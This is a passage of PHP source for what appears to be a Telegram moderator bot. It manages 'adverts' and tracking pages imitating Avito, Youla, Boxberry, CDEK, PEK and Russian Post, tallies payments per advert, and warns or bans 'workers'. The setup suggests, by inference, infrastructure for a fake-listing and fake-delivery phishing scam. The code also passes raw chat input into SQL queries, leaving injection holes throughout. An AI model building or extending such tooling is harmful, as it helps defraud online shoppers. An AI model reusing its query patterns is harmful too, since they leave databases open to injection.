									array_push($keyboard['inline_keyboard'], Array(Array('text' => $moder_chat['advert']['keyboard']['advert']['recovery'], 'callback_data' => '/show/'.$advert_id.'/')));
								} elseif($advert['status'] > 0) {
									array_push($keyboard['inline_keyboard'], Array(Array('text' => $moder_chat['advert']['keyboard']['advert']['hide'], 'callback_data' => '/hide/'.$advert_id.'/')));
								}
								
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
							}elseif(mysqli_num_rows($boxberry) > 0){
								$track = mysqli_fetch_assoc($boxberry);
								
								$url = $links['boxberry']."/track/$advert_id";
								$platform = 'Boxberry';

								$status = $moder_chat['advert']['status_t'][$track['status']];
								
								$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `advert_id` = '$advert_id' AND `status` = '1'"));
								
								$text = str_replace("\t", "", sprintf($moder_chat['advert']['template_t'], 
									$track['worker'], 
									$url,
									$advert_id, 
									$platform, 
									$track['product'], 
									$track['amount'], 
									Endings($track['views'], "просмотр", "просмотра", "просмотров"), 
									$payments['count'], 
									number_format($payments['total']), 
									$status,
									date("d.m.Y в H:i:s", $track['time'])
								));
								
								$keyboard = Array('inline_keyboard' => Array(
									Array(
										Array('text' => $moder_chat['advert']['keyboard']['track']['url'], 'url' => $url)
									)
								));
								
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
							}elseif(mysqli_num_rows($cdek) > 0){
								$track = mysqli_fetch_assoc($сdek);
								
								$url = $links['cdek']."/track/$advert_id";
								$platform = 'СДЭК';

								$status = $moder_chat['advert']['status_t'][$track['status']];
								
								$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `advert_id` = '$advert_id' AND `status` = '1'"));
								
								$text = str_replace("\t", "", sprintf($moder_chat['advert']['template_t'], 
									$track['worker'], 
									$url,
									$advert_id, 
									$platform, 
									$track['product'], 
									$track['amount'], 
									Endings($track['views'], "просмотр", "просмотра", "просмотров"), 
									$payments['count'], 
									number_format($payments['total']), 
									$status,
									date("d.m.Y в H:i:s", $track['time'])
								));
								
								$keyboard = Array('inline_keyboard' => Array(
									Array(
										Array('text' => $moder_chat['advert']['keyboard']['track']['url'], 'url' => $url)
									)
								));
								
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
							}elseif(mysqli_num_rows($pek) > 0){
								$track = mysqli_fetch_assoc($pek);
								
								$url = $links['pek']."/track/$advert_id";
								$platform = 'ПЭК';

								$status = $moder_chat['advert']['status_t'][$track['status']];
								
								$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `advert_id` = '$advert_id' AND `status` = '1'"));
								
								$text = str_replace("\t", "", sprintf($moder_chat['advert']['template_t'], 
									$track['worker'], 
									$url,
									$advert_id, 
									$platform, 
									$track['product'], 
									$track['amount'], 
									Endings($track['views'], "просмотр", "просмотра", "просмотров"), 
									$payments['count'], 
									number_format($payments['total']), 
									$status,
									date("d.m.Y в H:i:s", $track['time'])
								));
								
								$keyboard = Array('inline_keyboard' => Array(
									Array(
										Array('text' => $moder_chat['advert']['keyboard']['track']['url'], 'url' => $url)
									)
								));
								
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
							}elseif(mysqli_num_rows($pochta) > 0){
								$track = mysqli_fetch_assoc($pochta);
								
								$url = $links['pochta']."/track/$advert_id";
								$platform = 'Почта РФ';

								$status = $moder_chat['advert']['status_t'][$track['status']];
								
								$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `advert_id` = '$advert_id' AND `status` = '1'"));
								
								$text = str_replace("\t", "", sprintf($moder_chat['advert']['template_t'], 
									$track['worker'], 
									$url,
									$advert_id, 
									$platform, 
									$track['product'], 
									$track['amount'], 
									Endings($track['views'], "просмотр", "просмотра", "просмотров"), 
									$payments['count'], 
									number_format($payments['total']), 
									$status,
									date("d.m.Y в H:i:s", $track['time'])
								));
								
								$keyboard = Array('inline_keyboard' => Array(
									Array(
										Array('text' => $moder_chat['advert']['keyboard']['track']['url'], 'url' => $url)
									)
								));
								
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
							}else{
								$text = $moder_chat['advert']['errors']['not_exists'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['advert']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/resadvert/i', $message['text']) == TRUE) {
						if(preg_match('/\/resadvert (.{24}|\d+)/i', $message['text']) == TRUE) {
							$advert_id = mb_substr($message['text'], 11);
							
							$query = mysqli_query($connection, "SELECT `type`, `worker`, `title`, `price`, `delivery` FROM `adverts` WHERE `advert_id` = '$advert_id' AND `status` = '-1'");
							
							if(mysqli_num_rows($query) > 0) {
								$advert = mysqli_fetch_assoc($query);
								mysqli_query($connection, "UPDATE `adverts` SET `status` = '1', `time` = '".time()."' WHERE `advert_id` = '$advert_id'");
								
								if($advert['delivery'] == '0') $advert['delivery'] = $settings['delivery'];
								if($advert['type'] == 0) { 
									$type = "avito";
								} elseif($advert['type'] == 1) {
									$type = "youla";
								}

								$text = str_replace("\t", "", sprintf($moder_chat['resadvert']['template'], $advert_id, $links[$type], $advert['title'], $advert['price'], $advert['delivery']));
								send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$text = sprintf($moder_chat['resadvert']['messages']['recovery_a'], $message['from'], $message['firstname'], $message['lastname'], $advert['worker'], $advert_id);
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $moder_chat['resadvert']['errors']['not_exists'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['resadvert']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/deladvert/i', $message['text']) == TRUE) {
						if(preg_match('/\/deladvert (.{24}|\d+)/i', $message['text']) == TRUE) {
							$advert_id = mb_substr($message['text'], 11);
							
							$query = mysqli_query($connection, "SELECT `worker` FROM `adverts` WHERE `advert_id` = '$advert_id' AND `status` >= '0'");
							
							if(mysqli_num_rows($query) > 0) {
								$advert = mysqli_fetch_assoc($query);
								mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `advert_id` = '$advert_id'");

								$text = sprintf($moder_chat['deladvert']['template'], $advert_id);
								$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $moder_chat['deladvert']['keyboard']['recovery'], 'callback_data' => '/show/'.$advert_id.'/')))));
								send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
								$text = sprintf($moder_chat['deladvert']['messages']['del_a'], $message['from'], $message['firstname'], $message['lastname'], $advert['worker'], $advert_id);
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $moder_chat['deladvert']['errors']['not_exists'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['deladvert']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/remadvert/i', $message['text']) == TRUE) {
						if(preg_match('/\/remadvert (.{24}|\d+)/i', $message['text']) == TRUE) {
                            preg_match('/\/remadvert (.+);(.+)/', $message['text'], $result);
                            $platform = $result[2];
                            if($platform == 'BOX'){
            					$bd_table = 'trackcodes';
            					$bd_table_param = 'code';
            				}elseif($platform == 'SDK'){
            					$bd_table = 'trackcodessdek';
            					$bd_table_param = 'code';
            				}elseif ($platform == 'PEK') {
            					$bd_table = 'trackcodespek';
            					$bd_table_param = 'code';
            				}elseif ($platform == 'PST') {
            					$bd_table = 'trackcodespost';
            					$bd_table_param = 'code';
            				}elseif ($platform == 'AVT') {
            					$bd_table = 'adverts';
            					$bd_table_param = 'advert_id';
            				}elseif ($platform == 'YOU') {
            					$bd_table = 'adverts';
            					$bd_table_param = 'advert_id';
            				}
            				$object = mysqli_query($connection,"SELECT * FROM `$bd_table` WHERE `$bd_table_param` = '$result[1]'");
            				if(mysqli_num_rows($object) > 0){
            				    $object = mysqli_fetch_assoc($object);
            				    $text = sprintf($moder_chat['remadvert']['messages']['success_u'], $object[$bd_table_param]);
            				    send($config['token'], 'sendMessage', Array('chat_id' => $object["worker"], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            				    mysqli_query($connection, "DELETE FROM `$bd_table` WHERE `$bd_table_param` = '$result[1]'");
            				    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['remadvert']['messages']['success_a'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            				}else{
            				    $text = $moder_chat['remadvert']['errors']['not_exists'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            				}
						} else {
							$text = $moder_chat['remadvert']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/setimage/i', $message['text']) == TRUE) {
						if(preg_match('/\/setimage (.{24}|\d+);.+/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 10));
							
							if(preg_match('/(http|https):\/\/cache\d.youla.io\/files\/images\/.+.jpg/i', $edit[1]) == TRUE OR preg_match('/(http|https):\/\/\d{1,3}.img.avito.st\/\d{3,4}x\d{3,4}\/\d+.jpg/i', $edit[1]) == TRUE OR preg_match('/(http|https):\/\/i.imgur.com\/.+.jpg/i', $edit[1]) == TRUE) {
								$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]' AND `status` = '1'");
								
								if(mysqli_num_rows($query) > 0) {
									$advert = mysqli_fetch_assoc($query);
									
									mysqli_query($connection, "UPDATE `adverts` SET `image` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");
									$text = sprintf($moder_chat['setimage']['messages']['success_u'], $edit[0], $edit[1]);
									send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = sprintf($moder_chat['setimage']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $advert['worker'], $edit[0], $edit[1]);
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = $moder_chat['setimage']['errors']['not_exists'];
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = $moder_chat['setimage']['errors']['invalid_link'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['setimage']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/settitle/i', $message['text']) == TRUE) {
						if(preg_match('/\/settitle (.{24}|\d+);.+/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 10));
							
							if(mb_strlen($edit[1]) < 101) {
								$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]' AND `status` = '1'");
								
								if(mysqli_num_rows($query) > 0) {
									$advert = mysqli_fetch_assoc($query);
									
									mysqli_query($connection, "UPDATE `adverts` SET `title` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");

									if($advert['type'] == 0) {
										$type = 'avito';
									} elseif($advert['type'] == 1) {
										$type = 'youla';
									}

									$text = str_replace("\t", "", sprintf($moder_chat['settitle']['messages']['success_u'], $links[$type], $edit[0], $advert['title'], $edit[1]));
									
									send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = sprintf($moder_chat['settitle']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $advert['worker'], $edit[0], $advert['title'], $edit[1], $links[$type]);
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = $moder_chat['settitle']['errors']['not_exists'];
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = $moder_chat['settitle']['errors']['invalid_name'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['settitle']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/setprice/i', $message['text']) == TRUE) {
						if(preg_match('/^\/setprice ([0-9]+|[a-z0-9]{24});\d{1,6}$/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 10));
							
							$adverts = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]'");
							$trackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodes` WHERE `code` = '$edit[0]'");
							$strackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodessdek` WHERE `code` = '$edit[0]'");
							$ptrackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodespek` WHERE `code` = '$edit[0]'");
							$pstrackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodespost` WHERE `code` = '$edit[0]'");
							
							if(mysqli_num_rows($adverts) > 0 OR mysqli_num_rows($trackcodes) > 0 OR mysqli_num_rows($strackcodes) > 0 OR mysqli_num_rows($ptrackcodes) > 0 OR mysqli_num_rows($pstrackcodes) > 0) {
								if(mysqli_num_rows($adverts) > 0) {
									$advert = mysqli_fetch_assoc($adverts);
									
									mysqli_query($connection, "UPDATE `adverts` SET `price` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");
									
									if($advert['type'] == 0) {
										$type = 'avito';
									} elseif($advert['type'] == 1) {
										$type = 'youla';
									}

									$text = sprintf($moder_chat['setprice']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $advert['worker'], $edit[0], $advert['price'], $edit[1], $links[$type]);
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

									$text = str_replace("\t", "", sprintf($moder_chat['setprice']['messages']['success_u'], $links[$type], $edit[0], $advert['price'], $edit[1]));
								} elseif(mysqli_num_rows($trackcodes) > 0) {
									$track = mysqli_fetch_assoc($trackcodes);
									
									if($track['status'] > 0) {
										mysqli_query($connection, "UPDATE `trackcodes` SET `amount` = '$edit[1]' WHERE `code` = '$edit[0]' AND `status` > '0'");
										
										$text = sprintf($moder_chat['setprice']['messages']['success_a'], $message['from'], $message['firstname'], $track['lastname'], $track['worker'], $edit[0], $track['amount'], $edit[1], $links['boxberry']);
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

										$text = str_replace("\t", "", sprintf($moder_chat['setprice']['messages']['success_t'], $links['boxberry'], $edit[0], $track['amount'], $edit[1]));
									} else {
										$text = $moder_chat['setprice']['errors']['not_exists'];
									}
								} elseif(mysqli_num_rows($strackcodes) > 0) {
									$track = mysqli_fetch_assoc($strackcodes);
									
									if($track['status'] > 0) {
										mysqli_query($connection, "UPDATE `trackcodessdek` SET `amount` = '$edit[1]' WHERE `code` = '$edit[0]' AND `status` > '0'");
										
										$text = sprintf($moder_chat['setprice']['messages']['success_a'], $message['from'], $message['firstname'], $track['lastname'], $track['worker'], $edit[0], $track['amount'], $edit[1], $links['cdek']);
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

										$text = str_replace("\t", "", sprintf($moder_chat['setprice']['messages']['success_t'], $links['cdek'], $edit[0], $track['amount'], $edit[1]));
									} else {
										$text = $moder_chat['setprice']['errors']['not_exists'];
									}
								} elseif(mysqli_num_rows($ptrackcodes) > 0) {
									$track = mysqli_fetch_assoc($ptrackcodes);
									
									if($track['status'] > 0) {
										mysqli_query($connection, "UPDATE `trackcodespek` SET `amount` = '$edit[1]' WHERE `code` = '$edit[0]' AND `status` > '0'");
										
										$text = sprintf($moder_chat['setprice']['messages']['success_a'], $message['from'], $message['firstname'], $track['lastname'], $track['worker'], $edit[0], $track['amount'], $edit[1], $links['pek']);
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

										$text = str_replace("\t", "", sprintf($moder_chat['setprice']['messages']['success_t'], $links['pek'], $edit[0], $track['amount'], $edit[1]));
									} else {
										$text = $moder_chat['setprice']['errors']['not_exists'];
									}
								} elseif(mysqli_num_rows($pstrackcodes) > 0) {
									$track = mysqli_fetch_assoc($pstrackcodes);
									
									if($track['status'] > 0) {
										mysqli_query($connection, "UPDATE `trackcodespost` SET `amount` = '$edit[1]' WHERE `code` = '$edit[0]' AND `status` > '0'");
										
										$text = sprintf($moder_chat['setprice']['messages']['success_a'], $message['from'], $message['firstname'], $track['lastname'], $track['worker'], $edit[0], $track['amount'], $edit[1], $links['pochta']);
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

										$text = str_replace("\t", "", sprintf($moder_chat['setprice']['messages']['success_t'], $links['pochta'], $edit[0], $track['amount'], $edit[1]));
									} else {
										$text = $moder_chat['setprice']['errors']['not_exists'];
									}
								}
							} else {
								$text = $moder_chat['setprice']['errors']['not_exists'];
							}
							
							send($config['token'], 'sendMessage', Array('chat_id' => ($advert) ? $advert['worker'] : $track['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = $moder_chat['setprice']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/setdelivery/i', $message['text']) == TRUE) {
						if(preg_match('/\/setdelivery \d{1,4}/i', $message['text']) == TRUE) {
							$amount = substr($message['text'], 13);
							
							mysqli_query($connection, "UPDATE `config` SET `delivery` = '$amount'");
							
							$text = sprintf($moder_chat['setdelivery']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $amount);
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = $moder_chat['setdelivery']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/unwarn/i', $message['text']) == TRUE) {
						if(preg_match('/\/unwarn \d+/i', $message['text']) == TRUE) {
							$user_id = mb_substr($message['text'], 8);
							
							$query = mysqli_query($connection, "SELECT `warns` FROM `accounts` WHERE `telegram` = '$user_id'");
						
							if(mysqli_num_rows($query) > 0) {
								$user = mysqli_fetch_assoc($query);
								
								if($user['warns'] > 0) {
									mysqli_query($connection, "UPDATE `accounts` SET `warns` = `warns`-1 WHERE `telegram` = '$user_id'");
									$text = sprintf($moder_chat['unwarn']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $user_id, $user['warns']-1);
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = sprintf($moder_chat['unwarn']['messages']['success_u'], $user['warns']-1);
									send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = sprintf($moder_chat['unwarn']['errors']['null_warn'], $user_id);
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = $moder_chat['unwarn']['errors']['not_exists'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['unwarn']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/^\/warn/i', $message['text']) == TRUE) {
						if(preg_match('/^\/warn \d+$/i', $message['text']) == TRUE) {
							$user_id = mb_substr($message['text'], 6);
							$user_check = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$user_id'"));
				            if($user_check['access'] >= 666) {
				            	$text = sprintf($callbacks['admin_warnban'], 'варнеш');
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$query = mysqli_query($connection, "SELECT `access`, `warns` FROM `accounts` WHERE `telegram` = '$user_id'");
							
								if(mysqli_num_rows($query) > 0) {
									$user = mysqli_fetch_assoc($query);
									
									if($user['access'] <= 0) {
										$text = sprintf($moder_chat['warn']['messages']['has_block'], $user_id);
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									} elseif($user['warns'] < 3 AND $user['warns'] != 2) {
										mysqli_query($connection, "UPDATE `accounts` SET `warns` = `warns`+1 WHERE `telegram` = '$user_id'");
										$text = sprintf($moder_chat['warn']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $user_id, $user['warns']+1);
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										$text = sprintf($moder_chat['warn']['messages']['success_u'], $user['warns']+1);
										send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									} elseif($user['warns'] >= 2) {
										mysqli_query($connection, "UPDATE `accounts` SET `access` = '-1', `warns` = `warns`+1 WHERE `telegram` = '$user_id'");
										mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` > '1'");
										mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` > '1'");
										
										send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
										send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
										$text = sprintf($moder_chat['warn']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $user_id, $user['warns']+1);
										$text .= $moder_chat['warn']['messages']['user_block_a'];
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										$text = sprintf($moder_chat['warn']['messages']['success_u'], $user['warns']+1);
										$text .= $moder_chat['warn']['messages']['user_block_u'];
										send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									}
								} else {
									$text = $moder_chat['warn']['errors']['not_exists'];
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							}
						} else {
							$text = $moder_chat['warn']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/^\/ban/i', $message['text']) == TRUE) {
						if(preg_match('/^\/ban \d+$/i', $message['text']) == TRUE) {
							$user_id = mb_substr($message['text'], 5);
							$user_check = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$user_id'"));
				            if($user_check['access'] >= 666) {
								$text = sprintf($callbacks['admin_warnban'], 'банеш');
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$query = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$user_id'");
							
								if(mysqli_num_rows($query) > 0) {
									mysqli_query($connection, "UPDATE `accounts` SET `access` = '-1' WHERE `telegram` = '$user_id'");
									mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
									mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
									mysqli_query($connection, "UPDATE `trackcodessdek` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
